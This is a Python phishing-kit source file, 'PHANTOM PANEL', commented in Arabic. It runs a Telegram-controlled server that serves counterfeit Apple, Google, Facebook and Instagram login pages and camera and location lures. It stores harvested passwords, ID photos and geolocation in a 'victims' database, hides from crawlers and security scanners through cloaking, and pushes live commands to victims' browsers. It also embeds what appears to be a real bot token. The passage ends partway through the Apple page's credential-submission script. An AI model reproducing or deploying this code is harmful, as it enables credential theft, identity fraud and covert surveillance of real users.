#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================================
PHANTOM PANEL v3.0 - نظام التحكم الكامل بالاختراق
===============================================================================
إصدار احترافي مع جميع الميزات المطلوبة:
✅ نظام الأزرار الكامل (Control Panel)
✅ تعدد الصفحات الاحتيالية (Multi-Phishing Pages)
✅ حقن الأوامر المباشر (Live Injection)
✅ نظام التخفي والتمويه (Anti-Bot & Cloaking)
✅ تتبع مباشر للضحايا
✅ التقاط صور حية
===============================================================================
"""

import os
import sys
import json
import asyncio
import logging
import sqlite3
import hashlib
import hmac
import base64
import random
import string
import time
import datetime
import ipaddress
import socket
import ssl
import secrets
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from contextlib import asynccontextmanager
from collections import defaultdict
import aiohttp
from aiohttp import web
import aiofiles
import geoip2.database
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import jinja2
import user_agents
import psutil
import netifaces

# ===== مكتبات Telegram =====
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# ===== إعدادات متقدمة =====
BOT_TOKEN = "8577785694:AAHjX4eMdB6VR6q0RWZIUpxKnhY14zLHrQY"
ADMIN_IDS = [6888107255]  # ضع معرفات المشرفين هنا
SECRET_KEY = secrets.token_hex(32)
ENCRYPTION_KEY = hashlib.sha256(SECRET_KEY.encode()).digest()

# ===== المسارات =====
BASE_DIR = Path(__file__).parent.absolute()
TEMPLATES_DIR = BASE_DIR / "templates"
STATIC_DIR = BASE_DIR / "static"
DATA_DIR = BASE_DIR / "data"
VICTIMS_DIR = DATA_DIR / "victims"
SESSIONS_DIR = DATA_DIR / "sessions"
LOGS_DIR = BASE_DIR / "logs"
CERT_DIR = BASE_DIR / "certs"

for dir_path in [TEMPLATES_DIR, STATIC_DIR, DATA_DIR, VICTIMS_DIR, SESSIONS_DIR, LOGS_DIR, CERT_DIR]:
    dir_path.mkdir(parents=True, exist_ok=True)

# ===== إعداد السجلات =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / 'phantom_panel.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===== قاعدة بيانات الضحايا =====
class VictimDatabase:
    """قاعدة بيانات متقدمة للضحايا"""
    
    def __init__(self, db_path: Path = DATA_DIR / "victims.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """إنشاء جداول قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # جدول الضحايا الرئيسي
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS victims (
                id TEXT PRIMARY KEY,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                ip_address TEXT,
                user_agent TEXT,
                device_type TEXT,
                browser TEXT,
                os TEXT,
                screen_resolution TEXT,
                language TEXT,
                timezone TEXT,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                isp TEXT,
                proxy_detected BOOLEAN,
                vpn_detected BOOLEAN,
                tor_detected BOOLEAN,
                data_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                notes TEXT
            )
        """)
        
        # جدول الصور الملتقطة
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                capture_type TEXT,
                file_path TEXT,
                timestamp TIMESTAMP,
                metadata TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims(id)
            )
        """)
        
        # جدول البيانات المسروقة
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp TIMESTAMP,
                source_page TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims(id)
            )
        """)
        
        # جدول الجلسات الحية
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS live_sessions (
                victim_id TEXT PRIMARY KEY,
                session_token TEXT,
                connected_since TIMESTAMP,
                last_ping TIMESTAMP,
                current_page TEXT,
                injection_active BOOLEAN DEFAULT 0,
                pending_command TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims(id)
            )
        """)
        
        conn.commit()
        conn.close()
    
    def add_victim(self, victim_data: dict) -> str:
        """إضافة ضحية جديد"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        victim_id = f"victim_{int(time.time())}_{secrets.token_hex(4)}"
        
        cursor.execute("""
            INSERT INTO victims (
                id, first_seen, last_seen, ip_address, user_agent, 
                device_type, browser, os, screen_resolution, language,
                timezone, country, city, latitude, longitude, isp,
                proxy_detected, vpn_detected, tor_detected, status
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            victim_id,
            datetime.datetime.now(),
            datetime.datetime.now(),
            victim_data.get('ip'),
            victim_data.get('user_agent'),
            victim_data.get('device_type'),
            victim_data.get('browser'),
            victim_data.get('os'),
            victim_data.get('screen_resolution'),
            victim_data.get('language'),
            victim_data.get('timezone'),
            victim_data.get('country'),
            victim_data.get('city'),
            victim_data.get('latitude'),
            victim_data.get('longitude'),
            victim_data.get('isp'),
            victim_data.get('proxy_detected', False),
            victim_data.get('vpn_detected', False),
            victim_data.get('tor_detected', False),
            'active'
        ))
        
        conn.commit()
        conn.close()
        return victim_id
    
    def update_victim(self, victim_id: str, data: dict):
        """تحديث بيانات ضحية"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        set_clause = ", ".join([f"{k} = ?" for k in data.keys()])
        values = list(data.values())
        values.append(victim_id)
        
        cursor.execute(f"UPDATE victims SET {set_clause} WHERE id = ?", values)
        conn.commit()
        conn.close()
    
    def add_capture(self, victim_id: str, capture_type: str, file_path: str, metadata: dict = None):
        """إضافة صورة أو تسجيل"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO captures (victim_id, capture_type, file_path, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?)
        """, (victim_id, capture_type, file_path, datetime.datetime.now(), json.dumps(metadata)))
        
        # تحديث عداد البيانات
        cursor.execute("UPDATE victims SET data_count = data_count + 1 WHERE id = ?", (victim_id,))
        
        conn.commit()
        conn.close()
    
    def add_stolen_data(self, victim_id: str, data_type: str, data_content: str, source_page: str = None):
        """إضافة بيانات مسروقة"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO stolen_data (victim_id, data_type, data_content, timestamp, source_page)
            VALUES (?, ?, ?, ?, ?)
        """, (victim_id, data_type, data_content, datetime.datetime.now(), source_page))
        
        conn.commit()
        conn.close()
    
    def get_active_victims(self) -> List[dict]:
        """الحصول على الضحايا النشطين"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        # ضحايا نشطين خلال آخر 5 دقائق
        cutoff = datetime.datetime.now() - datetime.timedelta(minutes=5)
        
        cursor.execute("""
            SELECT v.*, ls.connected_since, ls.current_page, ls.injection_active
            FROM victims v
            LEFT JOIN live_sessions ls ON v.id = ls.victim_id
            WHERE v.last_seen > ? AND v.status = 'active'
            ORDER BY v.last_seen DESC
        """, (cutoff,))
        
        results = [dict(row) for row in cursor.fetchall()]
        conn.close()
        return results
    
    def get_live_sessions(self) -> List[dict]:
        """الحصول على الجلسات الحية"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT v.*, ls.*
            FROM live_sessions ls
            JOIN victims v ON ls.victim_id = v.id
            ORDER BY ls.last_ping DESC
        """)
        
        results = [dict(row) for row in cursor.fetchall()]
        conn.close()
        return results
    
    def register_live_session(self, victim_id: str, session_token: str):
        """تسجيل جلسة حية"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT OR REPLACE INTO live_sessions (victim_id, session_token, connected_since, last_ping)
            VALUES (?, ?, ?, ?)
        """, (victim_id, session_token, datetime.datetime.now(), datetime.datetime.now()))
        
        conn.commit()
        conn.close()
    
    def update_live_session(self, victim_id: str, data: dict):
        """تحديث جلسة حية"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        set_clause = ", ".join([f"{k} = ?" for k in data.keys()])
        values = list(data.values())
        values.append(victim_id)
        
        cursor.execute(f"UPDATE live_sessions SET {set_clause} WHERE victim_id = ?", values)
        conn.commit()
        conn.close()

# ===== نظام التخفي والتمويه =====
class CloakingSystem:
    """نظام متقدم للتمويه وحماية الرابط"""
    
    def __init__(self):
        self.bot_signatures = self.load_bot_signatures()
        self.safe_networks = self.load_safe_networks()
        self.whitelisted_ips = set()
        
    def load_bot_signatures(self) -> List[str]:
        """تحميل تواقيع البوتات"""
        return [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
            'yandexbot', 'facebookexternalhit', 'facebot', 'twitterbot',
            'applebot', 'linkedinbot', 'telegrambot', 'whatsapp',
            'python-requests', 'python-urllib', 'curl', 'wget',
            'Go-http-client', 'scrapy', 'AHC', 'PycURL'
        ]
    
    def load_safe_networks(self) -> List[ipaddress.ip_network]:
        """تحميل الشبكات الآمنة"""
        safe_networks = []
        
        # شبكات أمازون AWS
        safe_networks.extend([
            ipaddress.ip_network('52.94.0.0/16'),
            ipaddress.ip_network('54.239.0.0/16'),
            ipaddress.ip_network('52.95.0.0/16')
        ])
        
        # شبكات جوجل
        safe_networks.extend([
            ipaddress.ip_network('8.8.8.0/24'),
            ipaddress.ip_network('8.8.4.0/24'),
            ipaddress.ip_network('216.58.0.0/16')
        ])
        
        # شبكات Cloudflare
        safe_networks.extend([
            ipaddress.ip_network('103.21.244.0/22'),
            ipaddress.ip_network('103.22.200.0/22'),
            ipaddress.ip_network('104.16.0.0/12')
        ])
        
        return safe_networks
    
    def check_ip(self, ip: str) -> dict:
        """فحص IP"""
        result = {
            'is_bot': False,
            'is_safe': False,
            'reason': None
        }
        
        try:
            ip_obj = ipaddress.ip_address(ip)
            
            # التحقق من الشبكات الآمنة
            for network in self.safe_networks:
                if ip_obj in network:
                    result['is_safe'] = True
                    result['reason'] = 'safe_network'
                    return result
            
            # التحقق من الـ IPs الخاصة
            if ip_obj.is_private:
                result['is_safe'] = True
                result['reason'] = 'private_ip'
                return result
            
        except Exception as e:
            logger.error(f"خطأ في فحص IP: {e}")
        
        return result
    
    def check_user_agent(self, user_agent: str) -> dict:
        """فحص User-Agent"""
        result = {
            'is_bot': False,
            'is_safe': False,
            'bot_name': None,
            'reason': None
        }
        
        ua_lower = user_agent.lower()
        
        # التحقق من تواقيع البوتات
        for signature in self.bot_signatures:
            if signature in ua_lower:
                result['is_bot'] = True
                result['bot_name'] = signature
                result['reason'] = 'bot_signature'
                return result
        
        # تحليل User-Agent باستخدام مكتبة user_agents
        try:
            ua = user_agents.parse(user_agent)
            
            # إذا كان الجهاز غير معروف أو فارغ، قد يكون بوت
            if not ua.browser.family or ua.browser.family == 'Other':
                result['is_bot'] = True
                result['reason'] = 'unknown_browser'
            
        except Exception as e:
            logger.error(f"خطأ في تحليل User-Agent: {e}")
        
        return result
    
    def check_referer(self, referer: str) -> dict:
        """فحص Referer"""
        result = {
            'is_safe': False,
            'reason': None
        }
        
        if not referer:
            return result
        
        # قائمة المواقع الآمنة
        safe_domains = [
            'google.com', 'facebook.com', 'twitter.com', 'instagram.com',
            'youtube.com', 'linkedin.com', 'whatsapp.com', 'telegram.org',
            'icloud.com', 'apple.com', 'microsoft.com', 'amazon.com'
        ]
        
        for domain in safe_domains:
            if domain in referer:
                result['is_safe'] = True
                result['reason'] = f'referer_from_{domain}'
                break
        
        return result
    
    def should_serve_fake(self, request: web.Request) -> Tuple[bool, str]:
        """تحديد ما إذا كان يجب عرض صفحة مزيفة"""
        # الحصول على البيانات
        ip = request.remote
        user_agent = request.headers.get('User-Agent', '')
        referer = request.headers.get('Referer', '')
        
        # فحص IP
        ip_check = self.check_ip(ip)
        if ip_check['is_safe']:
            return True, ip_check['reason']
        
        # فحص User-Agent
        ua_check = self.check_user_agent(user_agent)
        if ua_check['is_bot']:
            return True, ua_check['reason']
        
        # فحص Referer
        ref_check = self.check_referer(referer)
        if ref_check['is_safe']:
            return True, ref_check['reason']
        
        # التحقق من الرؤوس المهمة
        headers = request.headers
        if not headers.get('Accept-Language'):
            return True, 'no_accept_language'
        
        if headers.get('Accept') == '*/*':
            return True, 'accept_all'
        
        return False, 'real_victim'

# ===== نظام الصفحات المتعددة =====
class PhishingPages:
    """مدير الصفحات الاحتيالية"""
    
    def __init__(self, templates_dir: Path):
        self.templates_dir = templates_dir
        self.env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(templates_dir),
            autoescape=True
        )
        self.pages = self.load_pages()
        
    def load_pages(self) -> dict:
        """تحميل جميع الصفحات"""
        pages = {}
        
        # صفحة Apple ID
        pages['apple'] = {
            'name': 'Apple ID Security Update',
            'template': 'apple.html',
            'icon': '🍎',
            'description': 'صفحة تحديث أمني لـ Apple ID',
            'redirect': 'https://www.icloud.com',
            'fields': ['username', 'password', 'full_name', 'phone']
        }
        
        # صفحة Google
        pages['google'] = {
            'name': 'Google Account Verification',
            'template': 'google.html',
            'icon': '🔍',
            'description': 'صفحة التحقق من حساب Google',
            'redirect': 'https://accounts.google.com',
            'fields': ['email', 'password', 'full_name']
        }
        
        # صفحة الموقع الجغرافي
        pages['location'] = {
            'name': 'Location Access Required',
            'template': 'location.html',
            'icon': '📍',
            'description': 'صفحة طلب الوصول للموقع',
            'redirect': 'https://www.google.com/maps',
            'fields': ['location_granted']
        }
        
        # صفحة التقاط الصور
        pages['camera'] = {
            'name': 'Camera Verification',
            'template': 'camera.html',
            'icon': '📸',
            'description': 'صفحة التحقق بالكاميرا',
            'redirect': 'https://www.instagram.com',
            'fields': ['photo_capture']
        }
        
        # صفحة Facebook
        pages['facebook'] = {
            'name': 'Facebook Security Check',
            'template': 'facebook.html',
            'icon': '📘',
            'description': 'صفحة التحقق الأمني لـ Facebook',
            'redirect': 'https://www.facebook.com',
            'fields': ['email', 'password']
        }
        
        # صفحة Instagram
        pages['instagram'] = {
            'name': 'Instagram Verification',
            'template': 'instagram.html',
            'icon': '📷',
            'description': 'صفحة التحقق من حساب Instagram',
            'redirect': 'https://www.instagram.com',
            'fields': ['username', 'password']
        }
        
        return pages
    
    def render_page(self, page_id: str, **kwargs) -> str:
        """عرض صفحة معينة"""
        if page_id not in self.pages:
            page_id = 'apple'  # صفحة افتراضية
        
        template = self.env.get_template(self.pages[page_id]['template'])
        return template.render(**kwargs)
    
    def get_page_info(self, page_id: str) -> dict:
        """الحصول على معلومات الصفحة"""
        return self.pages.get(page_id, self.pages['apple'])

# ===== نظام حقن الأوامر المباشر =====
class LiveInjectionSystem:
    """نظام حقن الأوامر المباشر للضحايا"""
    
    def __init__(self, db: VictimDatabase):
        self.db = db
        self.pending_commands = defaultdict(list)
        self.active_injections = {}
        
    async def inject_command(self, victim_id: str, command_type: str, command_data: dict) -> bool:
        """حقن أمر مباشر للضحية"""
        # التحقق من وجود الضحية
        active = self.db.get_live_sessions()
        victim_sessions = [s for s in active if s['victim_id'] == victim_id]
        
        if not victim_sessions:
            return False
        
        # إنشاء أمر مشفر
        command = {
            'id': secrets.token_hex(8),
            'type': command_type,
            'data': command_data,
            'timestamp': datetime.datetime.now().isoformat(),
            'expires': (datetime.datetime.now() + datetime.timedelta(minutes=5)).isoformat()
        }
        
        # حفظ الأمر
        self.pending_commands[victim_id].append(command)
        
        # تحديث الجلسة
        self.db.update_live_session(victim_id, {
            'pending_command': json.dumps(command),
            'injection_active': 1
        })
        
        return True
    
    def get_pending_command(self, victim_id: str) -> Optional[dict]:
        """الحصول على الأمر المعلق لضحية"""
        if victim_id in self.pending_commands and self.pending_commands[victim_id]:
            command = self.pending_commands[victim_id].pop(0)
            
            # التحقق من صلاحية الأمر
            expires = datetime.datetime.fromisoformat(command['expires'])
            if expires < datetime.datetime.now():
                return None
            
            return command
        
        return None
    
    def clear_injection(self, victim_id: str):
        """مسح الحقن النشط"""
        if victim_id in self.pending_commands:
            self.pending_commands[victim_id] = []
        
        self.db.update_live_session(victim_id, {
            'pending_command': None,
            'injection_active': 0
        })

# ===== خادم الويب الاحتيالي =====
class PhishingServer:
    """خادم الويب المتقدم للصفحات الاحتيالية"""
    
    def __init__(self, bot, db: VictimDatabase, cloaking: CloakingSystem, pages: PhishingPages, injection: LiveInjectionSystem):
        self.bot = bot
        self.db = db
        self.cloaking = cloaking
        self.pages = pages
        self.injection = injection
        self.app = web.Application()
        self.setup_routes()
        
    def setup_routes(self):
        """إعداد مسارات الخادم"""
        self.app.router.add_get('/', self.handle_root)
        self.app.router.add_get('/{page_id}', self.handle_page)
        self.app.router.add_post('/api/capture', self.handle_capture)
        self.app.router.add_post('/api/submit', self.handle_submit)
        self.app.router.add_post('/api/heartbeat', self.handle_heartbeat)
        self.app.router.add_get('/api/check_command', self.handle_check_command)
        self.app.router.add_post('/api/command_response', self.handle_command_response)
        self.app.router.add_static('/static', STATIC_DIR)
        
    async def handle_root(self, request: web.Request) -> web.Response:
        """معالجة الصفحة الرئيسية"""
        return web.HTTPFound('/apple')
    
    async def handle_page(self, request: web.Request) -> web.Response:
        """معالجة طلب صفحة معينة"""
        page_id = request.match_info.get('page_id', 'apple')
        ref = request.query.get('ref', '')
        victim_id = request.query.get('victim_id', '')
        
        # الحصول على معلومات الجهاز
        ip = request.remote
        user_agent = request.headers.get('User-Agent', '')
        
        # التحقق من التمويه
        serve_fake, reason = self.cloaking.should_serve_fake(request)
        
        if serve_fake:
            # عرض صفحة مزيفة
            fake_html = """
            <!DOCTYPE html>
            <html>
            <head><title>Google</title></head>
            <body>
                <script>window.location.href="https://www.google.com";</script>
            </body>
            </html>
            """
            return web.Response(text=fake_html, content_type='text/html')
        
        # إنشاء جلسة جديدة
        if not victim_id:
            victim_id = f"victim_{int(time.time())}_{secrets.token_hex(4)}"
        
        # تحليل User-Agent
        ua = user_agents.parse(user_agent)
        
        # جمع بيانات الضحية
        victim_data = {
            'ip': ip,
            'user_agent': user_agent,
            'device_type': ua.device.family,
            'browser': ua.browser.family,
            'os': ua.os.family,
            'screen_resolution': request.query.get('res', 'unknown'),
            'language': request.headers.get('Accept-Language', 'unknown'),
            'timezone': request.query.get('tz', 'unknown'),
            'referer': request.headers.get('Referer', ''),
            'ref': ref
        }
        
        # الحصول على معلومات الموقع من IP
        geo_data = await self.get_geo_info(ip)
        victim_data.update(geo_data)
        
        # حفظ الضحية في قاعدة البيانات
        self.db.add_victim(victim_data)
        
        # إنشاء رمز جلسة
        session_token = secrets.token_urlsafe(32)
        self.db.register_live_session(victim_id, session_token)
        
        # إشعار المشرف
        await self.bot.notify_new_victim(victim_id, victim_data)
        
        # عرض الصفحة المطلوبة
        page_html = self.pages.render_page(
            page_id,
            victim_id=victim_id,
            session_token=session_token,
            ref=ref
        )
        
        return web.Response(text=page_html, content_type='text/html')
    
    async def get_geo_info(self, ip: str) -> dict:
        """الحصول على معلومات جغرافية من IP"""
        result = {
            'country': 'Unknown',
            'city': 'Unknown',
            'latitude': None,
            'longitude': None,
            'isp': 'Unknown',
            'proxy_detected': False,
            'vpn_detected': False,
            'tor_detected': False
        }
        
        try:
            # استخدام API مجاني
            async with aiohttp.ClientSession() as session:
                async with session.get(f'http://ip-api.com/json/{ip}') as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get('status') == 'success':
                            result.update({
                                'country': data.get('country', 'Unknown'),
                                'city': data.get('city', 'Unknown'),
                                'latitude': data.get('lat'),
                                'longitude': data.get('lon'),
                                'isp': data.get('isp', 'Unknown'),
                                'proxy_detected': data.get('proxy', False),
                                'vpn_detected': 'vpn' in data.get('isp', '').lower(),
                                'tor_detected': data.get('tor', False)
                            })
        except Exception as e:
            logger.error(f"خطأ في الحصول على معلومات IP: {e}")
        
        return result
    
    async def handle_capture(self, request: web.Request) -> web.Response:
        """معالجة الصور الملتقطة"""
        try:
            data = await request.post()
            victim_id = data.get('victim_id')
            
            if 'photo' in data:
                photo = data['photo']
                if hasattr(photo, 'file'):
                    # حفظ الصورة
                    timestamp = int(time.time())
                    file_path = VICTIMS_DIR / victim_id / f"capture_{timestamp}.jpg"
                    file_path.parent.mkdir(parents=True, exist_ok=True)
                    
                    content = photo.file.read()
                    async with aiofiles.open(file_path, 'wb') as f:
                        await f.write(content)
                    
                    # حفظ في قاعدة البيانات
                    self.db.add_capture(victim_id, 'photo', str(file_path), {
                        'timestamp': timestamp,
                        'size': len(content)
                    })
                    
                    # إرسال إشعار للمشرف
                    await self.bot.notify_capture(victim_id, 'photo', file_path)
            
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            logger.error(f"خطأ في معالجة الصورة: {e}")
            return web.json_response({'status': 'error'}, status=500)
    
    async def handle_submit(self, request: web.Request) -> web.Response:
        """معالجة البيانات المرسلة من الضحية"""
        try:
            data = await request.json()
            victim_id = data.get('victim_id')
            page_id = data.get('page_id')
            form_data = data.get('form_data', {})
            
            # حفظ البيانات
            for key, value in form_data.items():
                self.db.add_stolen_data(victim_id, key, str(value), page_id)
            
            # إرسال إشعار للمشرف
            await self.bot.notify_data(victim_id, page_id, form_data)
            
            # إعادة توجيه إلى الصفحة الحقيقية
            redirect_url = self.pages.get_page_info(page_id)['redirect']
            
            return web.json_response({
                'status': 'success',
                'redirect': redirect_url
            })
            
        except Exception as e:
            logger.error(f"خطأ في معالجة البيانات: {e}")
            return web.json_response({'status': 'error'}, status=500)
    
    async def handle_heartbeat(self, request: web.Request) -> web.Response:
        """معالجة نبضات القلب من الضحية"""
        try:
            data = await request.json()
            victim_id = data.get('victim_id')
            
            if victim_id:
                self.db.update_live_session(victim_id, {
                    'last_ping': datetime.datetime.now()
                })
                
                self.db.update_victim(victim_id, {
                    'last_seen': datetime.datetime.now()
                })
            
            return web.json_response({'status': 'ok'})
            
        except Exception as e:
            logger.error(f"خطأ في معالجة نبضات القلب: {e}")
            return web.json_response({'status': 'error'}, status=500)
    
    async def handle_check_command(self, request: web.Request) -> web.Response:
        """التحقق من وجود أوامر معلقة للضحية"""
        victim_id = request.query.get('victim_id')
        
        if not victim_id:
            return web.json_response({'status': 'error'})
        
        command = self.injection.get_pending_command(victim_id)
        
        if command:
            return web.json_response({
                'status': 'command_pending',
                'command': command
            })
        
        return web.json_response({'status': 'no_command'})
    
    async def handle_command_response(self, request: web.Request) -> web.Response:
        """معالجة استجابة الضحية لأمر"""
        try:
            data = await request.json()
            victim_id = data.get('victim_id')
            command_id = data.get('command_id')
            response_data = data.get('response', {})
            
            # حفظ الاستجابة
            self.db.add_stolen_data(victim_id, f'command_response_{command_id}', json.dumps(response_data), 'injection')
            
            # إشعار المشرف
            await self.bot.notify_command_response(victim_id, command_id, response_data)
            
            # مسح الحقن
            self.injection.clear_injection(victim_id)
            
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            logger.error(f"خطأ في معالجة استجابة الأمر: {e}")
            return web.json_response({'status': 'error'}, status=500)

# ===== بوت التحكم الرئيسي =====
class PhantomControlBot:
    """بوت التحكم الرئيسي بنظام الأزرار الكامل"""
    
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        self.db = VictimDatabase()
        self.cloaking = CloakingSystem()
        self.pages = PhishingPages(TEMPLATES_DIR)
        self.injection = LiveInjectionSystem(self.db)
        self.server = PhishingServer(self, self.db, self.cloaking, self.pages, self.injection)
        
        self.setup_handlers()
        self.create_template_files()
        
    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        # أوامر أساسية
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("panel", self.cmd_panel))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        
        # معالجات الأزرار
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # معالجات الرسائل
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
    def create_template_files(self):
        """إنشاء ملفات القوالب"""
        
        # قالب Apple
        apple_template = TEMPLATES_DIR / "apple.html"
        if not apple_template.exists():
            apple_template.write_text("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple Security Update</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        .card { background: white; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 50px; }
        h1 { font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 10px; color: #1d1d1f; }
        p { text-align: center; color: #86868b; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: #0071e3; }
        .file-label { display: block; padding: 15px; background: #f5f5f7; border: 1px dashed #d2d2d7; border-radius: 12px; text-align: center; cursor: pointer; margin-bottom: 20px; color: #0071e3; }
        .file-label input { display: none; }
        button { width: 100%; padding: 16px; background: #0071e3; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #0077ed; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .hidden { display: none; }
        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000; }
        .modal { background: white; border-radius: 20px; padding: 30px; max-width: 350px; text-align: center; }
        .modal h3 { margin-bottom: 15px; }
        .modal p { margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
            </div>
            <h1>تحديث أمني إلزامي</h1>
            <p>يرجى تأكيد هويتك عبر تسجيل الدخول وإرفاق صورة الهوية لتجنب قفل حسابك.</p>
            
            <div class="input-group">
                <input type="text" id="full_name" placeholder="الاسم الكامل (اختياري)" autocomplete="name">
            </div>
            
            <div class="input-group">
                <input type="tel" id="phone" placeholder="رقم الجوال (اختياري)" autocomplete="tel">
            </div>
            
            <div class="input-group">
                <input type="email" id="username" placeholder="Apple ID" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
            </div>
            
            <label class="file-label">
                <span>📸 إرفاق صورة الهوية</span>
                <input type="file" id="photo" accept="image/*" capture="environment">
            </label>
            
            <button id="submitBtn">تحديث الآن</button>
        </div>
    </div>

    <div id="overlay" class="overlay" style="display: none;">
        <div class="modal">
            <h3>جاري التحقق</h3>
            <p>الرجاء الانتظار...</p>
        </div>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        const PAGE_ID = "apple";
        
        // إرسال نبضات القلب
        setInterval(async () => {
            try {
                await fetch('/api/heartbeat', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ victim_id: VICTIM_ID })
                });
            } catch(e) {}
        }, 30000);
        
        // التحقق من الأوامر
        setInterval(async () => {
            try {
                const response = await fetch(`/api/check_command?victim_id=${VICTIM_ID}`);
                const data = await response.json();
                
                if (data.status === 'command_pending') {
                    handleCommand(data.command);
                }
            } catch(e) {}
        }, 5000);
        
        function handleCommand(command) {
            if (command.type === 'show_message') {
                alert(command.data.message);
                
                // إرسال استجابة
                fetch('/api/command_response', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        command_id: command.id,
                        response: { seen: true }
                    })
                });
            }
            else if (command.type === 'request_photo') {
                // طلب صورة جديدة
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*';
                input.capture = 'environment';
                
                input.onchange = async function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        const formData = new FormData();
                        formData.append('victim_id', VICTIM_ID);
                        formData.append('photo', file);
                        
                        await fetch('/api/capture', {
                            method: 'POST',
                            body: formData
                        });
                        
                        alert('تم استلام الصورة، شكراً لك!');
                    }
                };
                
                input.click();
            }
        }
        
        document.getElementById('submitBtn').onclick = async function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('يرجى إدخال Apple ID وكلمة المرور');
                return;
            }
            
            this.disabled = true;
            this.textContent = 'جاري التحقق...';
            document.getElementById('overlay').style.display = 'flex';
            
            const formData = {
                username: username,
                password: password,
                full_name: document.getElementById('full_name').value,
                phone: document.getElementById('phone').value
            };
            
            try {
                const response = await fetch('/api/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        page_id: PAGE_ID,
                        form_data: formData
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
